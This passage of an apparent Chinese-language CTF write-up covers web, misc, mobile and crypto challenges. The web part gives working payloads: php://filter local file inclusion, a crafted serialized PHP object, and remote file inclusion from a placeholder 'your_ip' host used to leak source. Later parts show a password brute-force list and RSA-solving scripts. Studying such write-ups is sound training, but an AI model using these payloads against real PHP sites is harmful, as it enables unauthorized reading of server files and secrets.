+<span class="line" data-line="15"><span style="color:#6A737D">}</span></span>
+<span class="line" data-line="16"><span style="color:#6A737D">else{</span></span>
+<span class="line" data-line="17"><span style="color:#6A737D">die("NONONO!");</span></span>
+<span class="line" data-line="18"><span style="color:#6A737D">}</span></span>
+<span class="line" data-line="19"><span style="color:#6A737D">--></span></span>
+<span class="line" data-line="20"></span>
+<span class="line" data-line="21"></span>
+<span class="line" data-line="22"><span style="color:#E1E4E8">NONONO!</span></span></code></pre>
+<p>根据已知逻辑，直接构造，首先使用伪协议先读取 <code>route.php</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>read=php://filter/convert.base64-encode/resource=route.php&#x26;input=123</span></span></code></pre>
+<p>得到文件源码</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;</span><span style="color:#79B8FF">h1</span><span style="color:#F97583">></span><span style="color:#79B8FF">Here</span><span style="color:#79B8FF"> can</span><span style="color:#79B8FF"> you</span><span style="color:#79B8FF"> find</span><span style="color:#79B8FF"> the</span><span style="color:#79B8FF"> position</span><span style="color:#79B8FF"> of</span><span style="color:#79B8FF"> the</span><span style="color:#79B8FF"> flag</span><span style="color:#F97583">!&#x3C;/</span><span style="color:#79B8FF">h1</span><span style="color:#F97583">></span></span>
+<span class="line" data-line="2"></span>
+<span class="line" data-line="3"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">$position </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "f14g.php"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">$gadget </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "h1nt.php"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="6"><span style="color:#F97583">?></span></span></code></pre>
+<p>文件中又提到了 <code>h1nt.php</code> 接着读取</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">class</span><span style="color:#B392F0"> test</span></span>
+<span class="line" data-line="3"><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $position;</span></span>
+<span class="line" data-line="5"><span style="color:#F97583">    public</span><span style="color:#F97583"> function</span><span style="color:#79B8FF"> __clone</span><span style="color:#E1E4E8">(){  </span></span>
+<span class="line" data-line="6"><span style="color:#79B8FF">        echo</span><span style="color:#79B8FF"> file_get_contents</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">$this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">position); </span></span>
+<span class="line" data-line="7"><span style="color:#F97583">        return</span><span style="color:#79B8FF"> $this</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">position;</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">    }</span></span>
+<span class="line" data-line="9"><span style="color:#E1E4E8">}  </span></span>
+<span class="line" data-line="10"><span style="color:#F97583">?></span><span style="color:#E1E4E8">  </span></span></code></pre>
+<p>逻辑很简单直接根据逻辑构造代码</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#F97583">class</span><span style="color:#B392F0"> test</span></span>
+<span class="line" data-line="3"><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">    public</span><span style="color:#E1E4E8"> $position;</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">}  </span></span>
+<span class="line" data-line="6"></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">$f </span><span style="color:#F97583">=</span><span style="color:#F97583"> new</span><span style="color:#79B8FF"> test</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">$f</span><span style="color:#F97583">-></span><span style="color:#E1E4E8">position </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> 'f14g.php'</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="9"><span style="color:#79B8FF">var_dump</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">serialize</span><span style="color:#E1E4E8">($f));</span></span>
+<span class="line" data-line="10"><span style="color:#6A737D">// O:4:"test":1:{s:8:"position";s:8:"f14g.php";}</span></span></code></pre>
+<p>因为我们需要触发反序列化，所以 <code>read</code> 需要读取 <code>h1nt.php</code> ，最终传递的参数为</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>read=h1nt.php&#x26;input=O:4:"test":1:{s:8:"position";s:8:"f14g.php";}</span></span></code></pre>
+<h3 id="codecheck">CodeCheck</h3>
+<blockquote>
+<p>Check this code!</p>
+</blockquote>
+<p>查看网页源代码得到部分代码片段</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="html"><code><span class="line" data-line="1"><span style="color:#6A737D">&#x3C;!--</span></span>
+<span class="line" data-line="2"><span style="color:#6A737D">$flag = "***********";</span></span>
+<span class="line" data-line="3"><span style="color:#6A737D">if(!isset($_GET['a']) or !isset($_GET['b']))</span></span>
+<span class="line" data-line="4"><span style="color:#6A737D">{</span></span>
+<span class="line" data-line="5"><span style="color:#6A737D">die("NONONO");</span></span>
+<span class="line" data-line="6"><span style="color:#6A737D">}</span></span>
+<span class="line" data-line="7"><span style="color:#6A737D">if(file_get_contents($_GET['a'])!== "flag")</span></span>
+<span class="line" data-line="8"><span style="color:#6A737D">{</span></span>
+<span class="line" data-line="9"><span style="color:#6A737D">die("NONONO");</span></span>
+<span class="line" data-line="10"><span style="color:#6A737D">}</span></span>
+<span class="line" data-line="11"><span style="color:#6A737D">if(file_get_contents($_GET['b'])!==$_GET['c'])</span></span>
+<span class="line" data-line="12"><span style="color:#6A737D">{</span></span>
+<span class="line" data-line="13"><span style="color:#6A737D">die("NONONO");</span></span>
+<span class="line" data-line="14"><span style="color:#6A737D">}</span></span>
+<span class="line" data-line="15"><span style="color:#6A737D">if(isset($_GET['d']))</span></span>
+<span class="line" data-line="16"><span style="color:#6A737D">{</span></span>
+<span class="line" data-line="17"><span style="color:#6A737D">include($_GET['d']);</span></span>
+<span class="line" data-line="18"><span style="color:#6A737D">}--></span></span>
+<span class="line" data-line="19"><span style="color:#E1E4E8">NONONO</span></span></code></pre>
+<p>逻辑很简单，要求 <code>a</code> 读取的内容等于 <code>flag</code> ，然后 <code>b</code> 和 <code>c</code> 内容不相同，直接远程文件包含＋伪协议</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>http://e644ab7e50751e44.node.nsctf.cn/</span></span>
+<span class="line" data-line="2"><span>?a=http://your_ip/1.txt</span></span>
+<span class="line" data-line="3"><span>&#x26;b=http://your_ip/1.txt</span></span>
+<span class="line" data-line="4"><span>&#x26;c=flag</span></span>
+<span class="line" data-line="5"><span>&#x26;d=php://filter/convert.base64-encode/resource=index.php</span></span></code></pre>
+<hr>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;!--</span><span style="color:#E1E4E8"> </span></span>
+<span class="line" data-line="2"><span style="color:#E1E4E8">$flag </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "***********"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">if</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">!</span><span style="color:#79B8FF">isset</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">]) </span><span style="color:#F97583">or</span><span style="color:#F97583"> !</span><span style="color:#79B8FF">isset</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'b'</span><span style="color:#E1E4E8">]))</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="5"><span style="color:#F97583">    die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"NONONO"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="7"><span style="color:#F97583">if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">file_get_contents</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">])</span><span style="color:#F97583">!==</span><span style="color:#9ECBFF"> "flag"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="9"><span style="color:#F97583">    die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"NONONO"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="10"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="11"><span style="color:#F97583">if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">file_get_contents</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'b'</span><span style="color:#E1E4E8">])</span><span style="color:#F97583">!==</span><span style="color:#E1E4E8">$_GET[</span><span style="color:#9ECBFF">'c'</span><span style="color:#E1E4E8">])</span></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="13"><span style="color:#F97583">    die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"NONONO"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="14"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="15"><span style="color:#F97583">if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">isset</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'d'</span><span style="color:#E1E4E8">]))</span></span>
+<span class="line" data-line="16"><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="17"><span style="color:#F97583">    include</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'d'</span><span style="color:#E1E4E8">]);</span></span>
+<span class="line" data-line="18"><span style="color:#E1E4E8">}</span><span style="color:#F97583">--></span></span>
+<span class="line" data-line="19"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span><span style="color:#E1E4E8">  </span></span>
+<span class="line" data-line="20"><span style="color:#E1E4E8">$flag </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "flag{flag{a3722bcf95f64d05aab15a41a000fdfb}}"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="21"><span style="color:#F97583">if</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">!</span><span style="color:#79B8FF">isset</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">]) </span><span style="color:#F97583">or</span><span style="color:#F97583"> !</span><span style="color:#79B8FF">isset</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'b'</span><span style="color:#E1E4E8">]))</span></span>
+<span class="line" data-line="22"><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="23"><span style="color:#F97583">    die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"NONONO"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="24"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="25"><span style="color:#F97583">if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">file_get_contents</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'a'</span><span style="color:#E1E4E8">])</span><span style="color:#F97583">!==</span><span style="color:#9ECBFF"> "flag"</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="26"><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="27"><span style="color:#F97583">    die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"NONONO"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="28"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="29"><span style="color:#F97583">if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">file_get_contents</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'b'</span><span style="color:#E1E4E8">])</span><span style="color:#F97583">!==</span><span style="color:#E1E4E8">$_GET[</span><span style="color:#9ECBFF">'c'</span><span style="color:#E1E4E8">])</span></span>
+<span class="line" data-line="30"><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="31"><span style="color:#79B8FF">    var_dump</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'c'</span><span style="color:#E1E4E8">]);</span></span>
+<span class="line" data-line="32"><span style="color:#79B8FF">    var_dump</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">file_get_contents</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'b'</span><span style="color:#E1E4E8">]));</span></span>
+<span class="line" data-line="33"><span style="color:#F97583">    die</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"yes"</span><span style="color:#E1E4E8">);</span></span>
+<span class="line" data-line="34"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="35"><span style="color:#F97583">if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">isset</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'d'</span><span style="color:#E1E4E8">]))</span></span>
+<span class="line" data-line="36"><span style="color:#E1E4E8">{</span></span>
+<span class="line" data-line="37"><span style="color:#F97583">    include</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'d'</span><span style="color:#E1E4E8">]);</span></span>
+<span class="line" data-line="38"><span style="color:#E1E4E8">}</span></span>
+<span class="line" data-line="39"><span style="color:#F97583">?></span></span></code></pre>
+<h2 id="misc">Misc</h2>
+<h3 id="zip">zip</h3>
+<blockquote>
+<p>Simple Compress</p>
+</blockquote>
+<p>打开附件，文件备注了给了提示</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>The art of 0 and 1, and it will remain shorter than 9.</span></span></code></pre>
+<p>直接使用脚本列出所有可能，爆破得到密码 <code>01001101</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> itertools</span></span>
+<span class="line" data-line="2"></span>
+<span class="line" data-line="3"><span style="color:#E1E4E8">digits </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [</span><span style="color:#9ECBFF">'0'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'1'</span><span style="color:#E1E4E8">]</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">combinations </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> [</span><span style="color:#9ECBFF">''</span><span style="color:#E1E4E8">.join(combination) </span><span style="color:#F97583">for</span><span style="color:#E1E4E8"> combination </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> itertools.product(digits, </span><span style="color:#FFAB70">repeat</span><span style="color:#F97583">=</span><span style="color:#79B8FF">9</span><span style="color:#E1E4E8">)]</span></span>
+<span class="line" data-line="5"></span>
+<span class="line" data-line="6"><span style="color:#F97583">with</span><span style="color:#79B8FF"> open</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'pass.txt'</span><span style="color:#E1E4E8">, </span><span style="color:#9ECBFF">'w'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">as</span><span style="color:#E1E4E8"> f:</span></span>
+<span class="line" data-line="7"><span style="color:#F97583">    for</span><span style="color:#E1E4E8"> combination </span><span style="color:#F97583">in</span><span style="color:#E1E4E8"> combinations:</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">        f.write(combination </span><span style="color:#F97583">+</span><span style="color:#9ECBFF"> '</span><span style="color:#79B8FF">\n</span><span style="color:#9ECBFF">'</span><span style="color:#E1E4E8">)</span></span></code></pre>
+<h3 id="simpledocument">SimpleDocument</h3>
+<blockquote>
+<p>More than image.</p>
+</blockquote>
+<p>分离出一个 PDF 直接全选复制得到 flag（默认flag设置为了白色字体，所以看不到</p>
+<h3 id="beautifulimage">BeautifulImage</h3>
+<blockquote>
+<p>Cool Mountain</p>
+</blockquote>
+<p>lsb隐写，0通道存在一段base64</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>ZmxhZ3syNGVkZDc2ZTQ2YzIyYzY1Y2M1YmRkZDNjNmU0ZjZmM30=</span></span></code></pre>
+<h2 id="mobile">Mobile</h2>
+<h3 id="peacock">peacock</h3>
+<blockquote>
+<p>peacock</p>
+</blockquote>
+<p><code>jadx</code> 看半天没思路，直接尝试反编译 <code>so</code> 文件，发现是 <code>base64 </code>变表，直接解密即可</p>
+<p><img src="https://img.5ime.cn/nb-infosec-2023/image-20230520132350827.png" alt="image-20230520132350827"></p>
+<p><img src="https://img.5ime.cn/nb-infosec-2023/image-20230520132416298.png" alt="image-20230520132416298"></p>
+<h2 id="crypto">Crypto</h2>
+<h3 id="secret">secret</h3>
+<blockquote>
+<p>好神奇的密文！</p>
+</blockquote>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"></span>
+<span class="line" data-line="2"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> gmpy2</span></span>
+<span class="line" data-line="3"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> libnum</span></span>
+<span class="line" data-line="4"></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">p</span><span style="color:#F97583">=</span><span style="color:#79B8FF">134261118796789547851478407090640074022214132682000430136383795981942884853000826171189906102866323044078348933419038543719361923320694974970600426450755845839235949167391987970330836004768360774676424958554946699767582105556239177450470656065560178592346659948800891455240736405480828554486592172443394370831</span></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">q</span><span style="color:#F97583">=</span><span style="color:#79B8FF">147847444534152128997546931602292266094740889347154192420554904651813340915744328104100065373294346723964356736436709934871741161328286944150242733445542228293036404657556168844723521815836689387184856871091025434896710605688594847400051686361372872763001355411405782508020591933546964183881743133374126947753</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">n</span><span style="color:#F97583">=</span><span style="color:#79B8FF">19850163314401552502654477751795889962324360064924594948231168092741951675262933573691070993863763290962945190372400262526595224437463969238332927564085237271719298626877917792595603744433881409963046292095205686879015029586659384866719514948181682427744555313382838805740723664050846950001916332631397606277703888492927635867870538709596993987439225247816137975156657119509372023083507772730332482775258444611462771095896380644997011341265021719189098262072756342069189262188127428079017418048118345180074280858160934483114966968365184788420091050939327341754449300121493187658865378182447547202838325648863844192743</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">c</span><span style="color:#F97583">=</span><span style="color:#79B8FF">13913396366755010607043477552577268277928241319101215381662331498046080625902831202486646020767568921881185124894960242867254162927605416228460108399087406989258037017639619195506711090012877454131383568832750606102901110782045529267940504471322847364808094790662696785470594892244716137203781890284216874035486302506042263453255580475380742959201314003788553692977914357996982118328587119124144181290753389394149235381045389696841471483947310663329993873046123134587149661347999774958105091103806375702387084149309542351541021140111048408248121408401601979108510758891595550054699719801708646232427198902271953673874</span></span>
+<span class="line" data-line="9"><span style="color:#E1E4E8">e</span><span style="color:#F97583">=</span><span style="color:#79B8FF">28</span></span>
+<span class="line" data-line="10"></span>
+<span class="line" data-line="11"><span style="color:#E1E4E8">n </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> p </span><span style="color:#F97583">*</span><span style="color:#E1E4E8"> q</span></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">phi </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> (p </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">*</span><span style="color:#E1E4E8"> (q </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="13"></span>
+<span class="line" data-line="14"><span style="color:#E1E4E8">t </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> gmpy2.gcd(e, phi)</span></span>
+<span class="line" data-line="15"><span style="color:#E1E4E8">t1 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> e </span><span style="color:#F97583">//</span><span style="color:#E1E4E8"> t</span></span>
+<span class="line" data-line="16"><span style="color:#E1E4E8">dt1 </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> gmpy2.invert(t1, phi)</span></span>
+<span class="line" data-line="17"><span style="color:#E1E4E8">mt1 </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> pow</span><span style="color:#E1E4E8">(c, dt1, n)</span></span>
+<span class="line" data-line="18"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(mt1)</span></span>
+<span class="line" data-line="19"><span style="color:#E1E4E8">s, m </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> gmpy2.iroot(mt1, t)</span></span>
+<span class="line" data-line="20"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(s)</span></span>
+<span class="line" data-line="21"><span style="color:#79B8FF">print</span><span style="color:#E1E4E8">(libnum.n2s(</span><span style="color:#79B8FF">int</span><span style="color:#E1E4E8">(s)))</span></span></code></pre>
+<h3 id="morse的笔记本">Morse的笔记本</h3>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>你知道吗。今天我竟然在街上捡到了100元钞票，我当时简直惊呆了，太幸运了。于是我赶紧把钞票捡起来！心里面十分高兴。走了一段路之后，我看见了一个老奶奶在街角卖菜！我就想。这100元钞票对我来说并不是很重要。但对她可能就很有用了。于是我走过去！把钞票递给了她。她非常感激。说我是个好心人。我也因此感到十分快乐！因为我知道。这个世界因为有我们每一个人的善良而变得更美好，今天天气真的很好，我和小丽！小明越好一起去公园玩，在公园里，我们看见了一只可爱的小松鼠，它在树枝上蹦来蹦去！十分活泼可爱。我们还看见了一些漂亮的花朵，它们在微风中轻轻摇曳。像在跳舞一样！我们一边走一边欣赏，一边笑一边玩。真是度过了一个美好的下午。回家的路上！我感到心情特别愉悦。因为我知道。只要心怀善意！天下没有做不成的事情。我经常会感叹人生的短暂。时间的流逝。但我从未停止过前进的步伐！人生路上，有时候你会遇到阻碍。但只要你努力地挑战，不放弃。就能突破困境！实现自己的梦想，所以，不管你遇到什么样的挑战，都不要气馁！坚持下去，你一定会收获成功的喜悦。因为！只有那些坚定自己方向的人，才能走得更远，更自信。当我们遭遇挫折和失败的时候！不要被打倒。要用心去学习，从失败中汲取经验教训。然后重新站起来！更加坚定地追求自己的目标。成功并不是一蹴而就的，需要我们付出长久的努力和坚持！但只要我们一直前进，终究会到达成功的彼岸！所以。让我们一起勇敢面对人生的挑战。迎接成功的喜悦。</span></span>
+<span class="line" data-line="2"><span></span></span>
+<span class="line" data-line="3"><span>mesr{997a9k414dx8m4061u74v15m1y32201k}</span></span></code></pre>
+<p>又是脑洞题目，观察发现只存在 <code>,.!</code> 这三个符号，直接结合题目名转成摩斯电码</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>.--. .- ... ... .-- --- .-. -.. .. ... -.-. --- -. --. .-. .- - ...</span></span>
+<span class="line" data-line="2"><span>// PASSWORDISCONGRATS</span></span></code></pre>
+<p>维吉尼亚密码解密之后凯撒密码解密得到 flag</p>
+<p><img src="https://img.5ime.cn/nb-infosec-2023/image-20230520132826804.png" alt="image-20230520132826804"></p>
+<h3 id="rsa">rsa</h3>
+<blockquote>
+<p>用了什么数学知识嘞</p>
+</blockquote>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="python"><code><span class="line" data-line="1"><span style="color:#F97583">import</span><span style="color:#E1E4E8"> gmpy2</span></span>
+<span class="line" data-line="2"></span>
+<span class="line" data-line="3"><span style="color:#E1E4E8">n </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 36535558847082719901201561031181835346574576610950713924924272947759193576365817762980927638691696601293089537315055413746788190208875234794229119049056299551864869870291634941246362436491006904347559559494705922259007299126640817275929491680601926404543198957206717290905220235571289759182878331893962038379</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">c </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 532997872940452282189043430008002793694788439822465302532208754231005799057972378308576109082463996551992533174546386979606697890310597738637156771564229</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">a </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 2694858406312563434474553988904403597551484373358339092528913028454100111881368126493990657117571672510331411186745639563619323775673115439</span></span>
+<span class="line" data-line="6"></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">R </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> PolynomialRing(Zmod(n), </span><span style="color:#9ECBFF">'x'</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">x </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> R.gen()</span></span>
+<span class="line" data-line="9"><span style="color:#E1E4E8">f </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> 2</span><span style="color:#F97583"> *</span><span style="color:#E1E4E8"> a </span><span style="color:#F97583">*</span><span style="color:#E1E4E8"> x </span><span style="color:#F97583">+</span><span style="color:#79B8FF"> 1</span></span>
+<span class="line" data-line="10"><span style="color:#E1E4E8">f_monic </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> f.monic()</span></span>
+<span class="line" data-line="11"></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">ans </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> f_monic.small_roots(</span><span style="color:#FFAB70">X</span><span style="color:#F97583">=</span><span style="color:#79B8FF">2</span><span style="color:#F97583"> **</span><span style="color:#79B8FF"> 60</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">beta</span><span style="color:#F97583">=</span><span style="color:#79B8FF">0.4</span><span style="color:#E1E4E8">, </span><span style="color:#FFAB70">epsilon</span><span style="color:#F97583">=</span><span style="color:#79B8FF">0.05</span><span style="color:#E1E4E8">)</span></span>
+<span class="line" data-line="13"><span style="color:#E1E4E8">g </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> ans[</span><span style="color:#79B8FF">0</span><span style="color:#E1E4E8">]</span></span>
+<span class="line" data-line="14"></span>
+<span class="line" data-line="15"><span style="color:#E1E4E8">d </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> gmpy2.invert(gmpy2.mpz(</span><span style="color:#79B8FF">65537</span><span style="color:#E1E4E8">), gmpy2.mpz((a </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">*</span><span style="color:#E1E4E8"> (g </span><span style="color:#F97583">-</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">)))</span></span>
+<span class="line" data-line="16"><span style="color:#E1E4E8">m </span><span style="color:#F97583">=</span><span style="color:#E1E4E8"> gmpy2.powmod(gmpy2.mpz(c), d, gmpy2.mpz(a </span><span style="color:#F97583">*</span><span style="color:#E1E4E8"> g))</span></span>
+<span class="line" data-line="17"><span style="color:#E1E4E8">plaintext </span><span style="color:#F97583">=</span><span style="color:#79B8FF"> bytes</span><span style="color:#E1E4E8">.fromhex(</span><span style="color:#79B8FF">hex</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">int</span><span style="color:#E1E4E8">(m))[</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">:])</span></span>
